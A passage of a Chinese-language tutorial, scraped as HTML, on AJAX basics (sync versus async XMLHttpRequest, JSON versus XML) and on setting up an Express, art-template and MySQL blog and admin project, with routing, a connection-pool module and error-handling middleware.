class="headerlink" title="同步与异步"></a>同步与异步</h6><p>关于同步与异步的概念在生活中有很多常见的场景，举例说明。</p><blockquote><p>同步：一个人在同一个时刻只能做一件事情，在执行一些耗时的操作（不需要看管）不去做别的事，只是等待</p><p>异步：在执行一些耗时的操作（不需要看管）去做别的事，而不是等待</p></blockquote><p><code>xhr.open()</code> 方法第三个参数要求传入的是一个 <code>bool</code> 值，其作用就是设置此次请求是否采用异步方式执行，默认为 <code>true</code>，如果需要同步执行可以通过传递 <code>false</code> 实现：</p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'before ajax'</span><span class="token punctuation">)</span><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 默认第三个参数为 true 意味着采用异步方式执行</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./time.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 这里的代码最后执行</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request done'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'after ajax'</span><span class="token punctuation">)</span></code></pre><p>如果采用同步方式执行，则代码会卡死在 <code>xhr.send()</code> 这一步：</p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'before ajax'</span><span class="token punctuation">)</span><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 同步方式</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./time.php'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 同步方式 执行需要 先注册事件再调用 send，否则 readystatechange 无法触发</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 这里的代码最后执行</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request done'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'after ajax'</span><span class="token punctuation">)</span></code></pre><p>演示同步异步差异。</p><p>一定在发送请求 <code>send()</code> 之前注册 <code>readystatechange</code>（不管同步或者异步）</p><ul><li>为了让这个事件可以更加可靠（一定触发），一定是先注册</li></ul><p>了解同步模式即可，切记不要使用同步模式。</p><p>至此，我们已经大致了解了 AJAX 的基本 API 。</p><h6 id="响应数据格式"><a href="#响应数据格式" class="headerlink" title="响应数据格式"></a>响应数据格式</h6><blockquote><p>提问：如果希望服务端返回一个复杂数据，该如何处理？</p></blockquote><p>关心的问题就是服务端发出何种格式的数据，这种格式如何在客户端用 JavaScript 解析。</p><p>######## XML</p><p>一种数据描述手段</p><p>老掉牙的东西，简单演示一下，不在这里浪费时间，基本现在的项目不用了。</p><p>淘汰的原因：数据冗余太多</p><p>######## JSON</p><p>也是一种数据描述手段，类似于 JavaScript 字面量方式</p><p>服务端采用 JSON 格式返回数据，客户端按照 JSON 格式解析数据。</p><blockquote><p>不管是 JSON 也好，还是 XML，只是在 AJAX 请求过程中用到，并不代表它们之间有必然的联系，它们只是数据协议罢了</p></blockquote><h6 id="处理响应数据渲染"><a href="#处理响应数据渲染" class="headerlink" title="处理响应数据渲染"></a>处理响应数据渲染</h6><blockquote><p>模板引擎：</p><ul><li>artTemplate：<a href="https://aui.github.io/art-template/" target="_blank" rel="noopener">https://aui.github.io/art-template/</a></li></ul></blockquote><p>模板引擎实际上就是一个 API，模板引擎有很多种，使用方式大同小异，目的为了可以更容易的将数据渲染到HTML中</p><h6 id="兼容方案"><a href="#兼容方案" class="headerlink" title="兼容方案"></a>兼容方案</h6><p>XMLHttpRequest 在老版本浏览器（IE5/6）中有兼容问题，可以通过另外一种方式代替</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> XMLHttpRequest <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'Microsoft.XMLHTTP'</span><span class="token punctuation">)</span></code></pre><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><h6 id="AJAX-请求封装"><a href="#AJAX-请求封装" class="headerlink" title="AJAX 请求封装"></a>AJAX 请求封装</h6><h6 id="jQuery-ajax"><a href="#jQuery-ajax" class="headerlink" title="jQuery.ajax"></a>jQuery.ajax</h6><h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><h6 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h6><h6 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h6><p>######## JSONP</p><p>######## CORS</p><h4 id="XHR-2-0"><a href="#XHR-2-0" class="headerlink" title="XHR 2.0"></a>XHR 2.0</h4><blockquote><p>暂作了解，无需着重看待</p></blockquote><h6 id="onload-onprogress"><a href="#onload-onprogress" class="headerlink" title="onload / onprogress"></a>onload / onprogress</h6><h6 id="FormData"><a href="#FormData" class="headerlink" title="FormData"></a>FormData</h6><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="http://www.w3school.com.cn/ajax/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/ajax/index.asp</a></li><li><a href="https://aui.github.io/art-template/zh-cn" target="_blank" rel="noopener">https://aui.github.io/art-template/zh-cn</a></li></ul><h2 id="阿里百秀综合案例"><a href="#阿里百秀综合案例" class="headerlink" title="阿里百秀综合案例"></a>阿里百秀综合案例</h2><h4 id="课程介绍"><a href="#课程介绍" class="headerlink" title="课程介绍"></a>课程介绍</h4><h6 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h6><h6 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h6><ul><li>服务端开发<ul><li>服务端</li><li>Express</li><li>数据库</li><li>HTTP</li><li>…</li></ul></li><li>ECMAScript 6</li><li>Ajax</li><li>前后端交互开发</li></ul><h6 id="学习目标-1"><a href="#学习目标-1" class="headerlink" title="学习目标"></a>学习目标</h6><blockquote><p>核心：能掌握基本的网站前后端开发（博客系统）</p></blockquote><ul><li><p>能掌握使用 express 开放静态资源</p></li><li><p>能掌握模板引擎中提取母版页和模板继承的使用</p></li><li><p>能理解路由模块的提取</p></li><li><p>能理解数据库操作模块的封装</p></li><li><p>能完成分类列表异步加载的前后端实现</p></li><li><p>能完成删除分类功能</p></li><li><p>能完成添加分类功能</p></li><li><p>能完成编辑分类功能</p></li><li><p>能完成用户列表功能</p></li><li><p>能完成添加用户功能</p></li><li><p>能完成删除用户功能</p></li><li><p>能完成编辑用户功能</p></li><li><p>能完成用户登录功能</p></li><li><p>能完成用户退出功能</p></li><li><p>能完成添加文章功能</p></li><li><p>能完成文章列表功能</p></li><li><p>能完成删除文章功能</p></li><li><p>能完成编辑文章功能</p></li><li><p>能完成添加广告图功能</p></li><li><p>能完成广告图列表功能</p></li><li><p>能完成删除广告图功能</p></li><li><p>能完成编辑广告图功能</p></li><li><p>能完成网站设置功能</p></li><li><p>能完成个人中心功能</p></li><li><p>能完成修改密码功能</p></li><li><p>能根据文档使用 jquery-validation 验证插件</p></li><li><p>能根据文档使用富文本编辑器插件</p></li><li><p>能根据文档使用 ajv 验证插件</p></li><li><p>能理解分页接口的实现</p></li><li><p>能根据文档使用客户端分页插件</p></li></ul><ul><li>能够理解 MVC 模式在项目中的意义</li><li>分类管理</li><li>用户管理<ul><li>能够使用Ajax方式添加管理员</li><li>能够使用Ajax方式展示管理员列表</li><li>能够使用Ajax方式完成编辑管理员</li><li>能够使用Ajax方式完成删除管理员</li></ul></li><li>用户登录<ul><li>能够使用传统方式完成用户登录</li><li>能够使用Ajax方式完成用户登录</li></ul></li><li>文章管理<ul><li>能够使用Ajax方式完成发布新文章</li><li>能够通过查看文档掌握富文本编辑器的使用</li><li>能够理解分页技术的交互过程</li><li>能够通过查看文档使用客户端分页插件</li><li>能够使用Ajax方式完成展示文章列表</li><li>能够使用Ajax方式完成编辑文章</li><li>能够使用Ajax方式完成删除文章</li></ul></li><li>评论管理<ul><li>能够使用Ajax+分页方式展示评论列表</li><li>能够使用Ajax方式删除评论</li><li>能够使用Ajax方式操作评论的通过状态</li></ul></li><li>网站设置<ul><li>能够掌握传统方式的表单文件提交前后端处理流程</li><li>能够掌握Ajax异步表单文件提交前后端处理流程</li><li>能够使用Ajax方式完成网站基本信息设置</li></ul></li><li>图片轮播管理<ul><li>能够使用Ajax方式完成添加轮播项</li><li>能够使用Ajax方式展示轮播列表</li><li>能够使用Ajax方式编辑轮播项</li><li>能够使用Ajax方式删除轮播项</li></ul></li><li>菜单管理<ul><li>能够使用Ajax方式完成添加导航菜单项</li><li>能够使用Ajax方式展示导航菜单列表</li><li>能够使用Ajax方式编辑导航菜单项</li><li>能够使用Ajax方式删除导航菜单项</li></ul></li><li>客户端前台<ul><li>能够使用Ajax方式加载轮播图列表</li><li>能够使用Ajax+分页方式加载内容列表</li><li>能够使用动态路由导航方式加载内容详情</li><li>能够使用Ajax方式完成发布评论</li><li>能够使用Ajax+异步分页（加载更多）方式完成评论列表展示</li></ul></li></ul><h6 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h6><h4 id="起步-1"><a href="#起步-1" class="headerlink" title="起步"></a>起步</h4><h6 id="初始化项目目录结构"><a href="#初始化项目目录结构" class="headerlink" title="初始化项目目录结构"></a>初始化项目目录结构</h6><pre><code>.├── node_modules 第三方包存储目录(使用npm装包默认生成)├── controllers 控制器├── models 模型├── public 静态资源（图片、样式、客户端js...）├── views 视图(存储HTML视图文件)├── app.js 应用程序启动入口（加载Express，启动HTTP服务。。。）├── config.js 应用配置文件（把经常需要改动的数据放到配置文件中，修改方便）├── utils 存储工具模块（例如用来操作数据库的模块）├── middlewares 放置自定义中间件├── routes 存储路由相关模块├── package.json 项目包说明文件，用来存储项目名称，第三方包依赖等信息（通过 npm init初始化）├── package-lock.json npm产生的包说明文件（由npm装包自动产生）└── README.md 项目说明文件</code></pre><h6 id="使用-Express-创建-Web-服务"><a href="#使用-Express-创建-Web-服务" class="headerlink" title="使用 Express 创建 Web 服务"></a>使用 Express 创建 Web 服务</h6><ol><li>安装 Express</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i express</code></pre><ol start="2"><li>在 <code>app.js</code> 中写入以下内容</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Serve listening http://127.0.0.1:3000/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="3"><li>使用 <a href="https://github.com/remy/nodemon" target="_blank" rel="noopener">nodemon</a> 启动开发模式</li></ol><pre class=" language-bash"><code class="language-bash">nodemon app.js</code></pre><ol start="4"><li>在浏览器中访问 <code>http://127.0.0.1:3000/</code></li></ol><h6 id="导入并开放静态资源"><a href="#导入并开放静态资源" class="headerlink" title="导入并开放静态资源"></a>导入并开放静态资源</h6><ol><li><p>将模板中的 html 静态文件放到项目的 <code>views</code> 目录中</p></li><li><p>将模板中的静态资源（css、图片、客户端js）放到 <code>public</code> 目录中</p></li><li><p>在 Web 服务中把 <code>public</code> 目录开放出来</p></li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/public'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre><ol start="4"><li>测试访问 public 中的资源</li></ol><h6 id="使用模板引擎渲染页面"><a href="#使用模板引擎渲染页面" class="headerlink" title="使用模板引擎渲染页面"></a>使用模板引擎渲染页面</h6><p>在 Node 中，不仅仅有 art-template 这个模板引擎，还有很多别的。</p><ul><li>ejs</li><li>pug</li><li>handlebars</li><li>nunjucks</li><li>…</li></ul><blockquote><p>参考文档：</p><ul><li><a href="https://aui.github.io/art-template/express/" target="_blank" rel="noopener">https://aui.github.io/art-template/express/</a></li></ul></blockquote><ol><li>安装</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i art-template express-art-template</code></pre><ol start="2"><li>配置</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>.// res.render<span class="token punctuation">(</span><span class="token punctuation">)</span> 的时候默认去 views 中查找模板文件// 如果想要修改，可以使用下面的方式app.set<span class="token punctuation">(</span><span class="token string">'views'</span>, <span class="token string">'模板文件存储路径'</span><span class="token punctuation">)</span>// express-art-template 内部依赖了 art-templateapp.engine<span class="token punctuation">(</span><span class="token string">'html'</span>, require<span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">))</span><span class="token punctuation">..</span>.</code></pre><ol start="3"><li>使用</li></ol><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// render 方法内部就会去</span>  <span class="token comment" spellcheck="true">// 1. 读取文件</span>  <span class="token comment" spellcheck="true">// 2. 模板引擎解析替换</span>  <span class="token comment" spellcheck="true">// 3. 发送响应结果</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>修改页面中的静态资源引用路径让页面中的资源正常加载</li><li>浏览测试</li></ol><h6 id="提取路由模块"><a href="#提取路由模块" class="headerlink" title="提取路由模块"></a>提取路由模块</h6><ul><li><p>简单应用提取一个路由文件模块</p></li><li><p>将来路由越来越多，所以按照不同的业务分门别类的创建了多个路由文件模块放到了 routes 目录中，好管理和维护。</p></li></ul><p>提取路由模块操作步骤：</p><ol><li><p>创建路由文件</p></li><li><p>写入以下基本内容</p></li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 自定义路由内容</span><span class="token comment" spellcheck="true">// router.get</span><span class="token comment" spellcheck="true">// router.get</span><span class="token comment" spellcheck="true">// router.post</span><span class="token comment" spellcheck="true">// ...</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router</code></pre><ol start="3"><li>在 <code>app.js</code> 中挂载路由模块</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token comment" spellcheck="true">// 加载路由模块</span><span class="token keyword">const</span> 路由模块 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'路由模块路径'</span><span class="token punctuation">)</span><span class="token operator">...</span><span class="token comment" spellcheck="true">// 挂载路由模块到 app 上</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>路由模块<span class="token punctuation">)</span><span class="token operator">...</span></code></pre><ol start="4"><li>打开浏览器访问路由路径进行测试。</li></ol><h6 id="提取模板页"><a href="#提取模板页" class="headerlink" title="提取模板页"></a>提取模板页</h6><blockquote><p>参考文档：</p><ul><li><a href="https://aui.github.io/art-template/docs/syntax.html##Template-inheritance" target="_blank" rel="noopener">art-template 模板继承</a><ul><li>extend</li><li>block</li></ul></li><li><a href="https://aui.github.io/art-template/docs/syntax.html##Sub-template" target="_blank" rel="noopener">art-template 子模板</a><ul><li>include</li></ul></li></ul></blockquote><h6 id="走通页面路由导航"><a href="#走通页面路由导航" class="headerlink" title="走通页面路由导航"></a>走通页面路由导航</h6><table><thead><tr><th>请求路径</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>/</td><td>渲染门户端首页</td><td></td></tr><tr><td>/posts</td><td>渲染门户端文章列表页</td><td></td></tr><tr><td>/posts/:id</td><td>渲染门户端文章详情页</td><td></td></tr><tr><td>/admin</td><td>渲染管理系统首页</td><td></td></tr><tr><td>/admin/posts</td><td>渲染管理系统文章列表页</td><td></td></tr><tr><td>/admin/categories</td><td>渲染管理系统文章分类页</td><td></td></tr><tr><td>/admin/login</td><td>渲染管理系统登录页</td><td></td></tr><tr><td>/admin/users</td><td>渲染管理系统用户管理页</td><td></td></tr><tr><td>/admin/posts/new</td><td>渲染管理系统添加文章页面</td><td></td></tr><tr><td>/admin/banners</td><td>渲染管理系统轮播管理页面</td><td></td></tr><tr><td>/admin/website</td><td>渲染管理系统网站设置页面</td><td></td></tr><tr><td>/admin/comments</td><td>渲染管理系统评论管理页面</td><td></td></tr><tr><td>/admin/settings/profile</td><td>渲染管理系统个人中心页面</td><td></td></tr><tr><td>/admin/settings/reset-pwd</td><td>渲染管理系统设置密码页面</td><td></td></tr><tr><td>…</td><td>…</td><td></td></tr></tbody></table><h6 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h6><ul><li>新建一个数据库命名为 <code>alishow</code></li><li>在 <code>alishow</code> 数据库中执行下发的数据库文件 <code>ali.sql</code></li><li>了解表的含义</li></ul><h6 id="封装数据库操作模块"><a href="#封装数据库操作模块" class="headerlink" title="封装数据库操作模块"></a>封装数据库操作模块</h6><blockquote><p>参考文档：</p><ul><li><a href="https://github.com/mysqljs/mysql" target="_blank" rel="noopener">https://github.com/mysqljs/mysql</a></li></ul></blockquote><ol><li>安装</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i mysql</code></pre><ol start="2"><li>基本使用</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> mysql      <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  host     <span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>  user     <span class="token punctuation">:</span> <span class="token string">'me'</span><span class="token punctuation">,</span>  password <span class="token punctuation">:</span> <span class="token string">'secret'</span><span class="token punctuation">,</span>  database <span class="token punctuation">:</span> <span class="token string">'my_db'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connection<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT 1 + 1 AS solution'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The solution is: '</span><span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>solution<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connection<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ol start="3"><li>上面的方式是创建了单个连接，不靠谱，一旦这个连接挂掉，就无法操作数据库。我们推荐使用连接池的方式来操作数据库，所以将单个连接的方式改为如下连接池的方式。</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> mysql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> pool  <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createPool</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  connectionLimit <span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>  host            <span class="token punctuation">:</span> <span class="token string">'example.org'</span><span class="token punctuation">,</span>  user            <span class="token punctuation">:</span> <span class="token string">'bob'</span><span class="token punctuation">,</span>  password        <span class="token punctuation">:</span> <span class="token string">'secret'</span><span class="token punctuation">,</span>  database        <span class="token punctuation">:</span> <span class="token string">'my_db'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pool<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT 1 + 1 AS solution'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The solution is: '</span><span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>solution<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ol start="4"><li>我们在项目的很多地方都要操作数据库，所以为了方便，我们将数据库操作封装为了一个单独的工具模块放到了 <code>utils/db.js</code> 中，哪里使用就在哪里加载。</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> mysql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 创建一个连接池</span><span class="token comment" spellcheck="true">// 连接池中创建了多个连接</span><span class="token keyword">const</span> pool <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createPool</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  connectionLimit<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 连接池的限制大小</span>  host<span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>  user<span class="token punctuation">:</span> <span class="token string">'root'</span><span class="token punctuation">,</span>  password<span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>  database<span class="token punctuation">:</span> <span class="token string">'alishow63'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 把连接池导出</span><span class="token comment" spellcheck="true">// 谁要操作数据库，谁就加载 db.js 模块，拿到 poll，点儿出 query 方法操作</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> pool</code></pre><ol start="5"><li>例如在 <code>xxx</code> 模块中需要操作数据库，则可以直接</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'db模块路径'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 执行数据库操作</span>db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre><h6 id="测试渲染文章列表页"><a href="#测试渲染文章列表页" class="headerlink" title="测试渲染文章列表页"></a>测试渲染文章列表页</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utilds/db'</span><span class="token punctuation">)</span><span class="token operator">...</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/admin/posts'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT * FROM `ali_aicle`'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> err    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin/posts.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      posts<span class="token punctuation">:</span> ret    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre><h6 id="服务端全局错误处理"><a href="#服务端全局错误处理" class="headerlink" title="服务端全局错误处理"></a>服务端全局错误处理</h6><p>利用错误处理中间件：<a href="http://expressjs.com/en/guide/error-handling.html" target="_blank" rel="noopener">http://expressjs.com/en/guide/error-handling.html</a></p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 1. 记录错误日志</span>  <span class="token comment" spellcheck="true">// 2. 一些比较严重的错误，还应该通知网站负责人或是开发人员等</span>  <span class="token comment" spellcheck="true">//    可以通过程序调用第三方服务，发短信，发邮件</span>  <span class="token comment" spellcheck="true">// 3. 把错误消息发送到客户端 500 Server Internal Error</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    error<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token 